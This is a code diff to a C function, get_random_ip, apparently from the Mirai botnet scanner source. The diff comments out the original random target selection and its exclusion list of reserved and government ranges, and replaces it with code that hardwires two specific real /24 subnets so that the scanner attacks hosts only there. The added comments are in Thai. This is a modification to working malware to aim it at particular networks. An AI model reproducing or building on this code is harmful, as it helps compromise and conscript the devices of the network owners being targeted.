@@ -676,29 +676,43 @@ static ipv4_t get_random_ip(void)
     uint32_t tmp;
     uint8_t o1, o2, o3, o4;
 
-    do
-    {
-        tmp = rand_next();
+    // do
+    // {
+    //     tmp = rand_next();
 
-        o1 = tmp & 0xff;
-        o2 = (tmp >> 8) & 0xff;
-        o3 = (tmp >> 16) & 0xff;
-        o4 = (tmp >> 24) & 0xff;
+    //     o1 = tmp & 0xff;
+    //     o2 = (tmp >> 8) & 0xff;
+        // o3 = (tmp >> 16) & 0xff;
+    //     o4 = (tmp >> 24) & 0xff;
+    // }
+    // while (o1 == 127 ||                             // 127.0.0.0/8      - Loopback
+    //       (o1 == 0) ||                              // 0.0.0.0/8        - Invalid address space
+    //       (o1 == 3) ||                              // 3.0.0.0/8        - General Electric Company
+    //       (o1 == 15 || o1 == 16) ||                 // 15.0.0.0/7       - Hewlett-Packard Company
+    //       (o1 == 56) ||                             // 56.0.0.0/8       - US Postal Service
+    //       (o1 == 10) ||                             // 10.0.0.0/8       - Internal network
+    //       (o1 == 192 && o2 == 168) ||               // 192.168.0.0/16   - Internal network
+    //       (o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/14    - Internal network
+    //       (o1 == 100 && o2 >= 64 && o2 < 127) ||    // 100.64.0.0/10    - IANA NAT reserved
+    //       (o1 == 169 && o2 > 254) ||                // 169.254.0.0/16   - IANA NAT reserved
+    //       (o1 == 198 && o2 >= 18 && o2 < 20) ||     // 198.18.0.0/15    - IANA Special use
+    //       (o1 >= 224) ||                            // 224.*.*.*+       - Multicast
+    //       (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
+    // );
+
+    // เลือก Subnet ก่อนเลย (แคบตั้งแต่แรก)
+    if (rand_next() % 2 == 0) {
+        o1 = 110; o2 = 164; o3 = 20;
+    } else {
+        o1 = 125; o2 = 20; o3 = 30;
     }
-    while (o1 == 127 ||                             // 127.0.0.0/8      - Loopback
-          (o1 == 0) ||                              // 0.0.0.0/8        - Invalid address space
-          (o1 == 3) ||                              // 3.0.0.0/8        - General Electric Company
-          (o1 == 15 || o1 == 16) ||                 // 15.0.0.0/7       - Hewlett-Packard Company
-          (o1 == 56) ||                             // 56.0.0.0/8       - US Postal Service
-          (o1 == 10) ||                             // 10.0.0.0/8       - Internal network
-          (o1 == 192 && o2 == 168) ||               // 192.168.0.0/16   - Internal network
-          (o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/14    - Internal network
-          (o1 == 100 && o2 >= 64 && o2 < 127) ||    // 100.64.0.0/10    - IANA NAT reserved
-          (o1 == 169 && o2 > 254) ||                // 169.254.0.0/16   - IANA NAT reserved
-          (o1 == 198 && o2 >= 18 && o2 < 20) ||     // 198.18.0.0/15    - IANA Special use
-          (o1 >= 224) ||                            // 224.*.*.*+       - Multicast
-          (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
-    );
+
+    // สุ่ม octet สุดท้าย
+    do {
+        o4 = rand_next() & 0xFF;
+    } while (o4 == 0 || o4 == 255 || o4 == 1);  // ข้าม .0 .1 .255
+
+
 
     return INET_ADDR(o1,o2,o3,o4);
 }
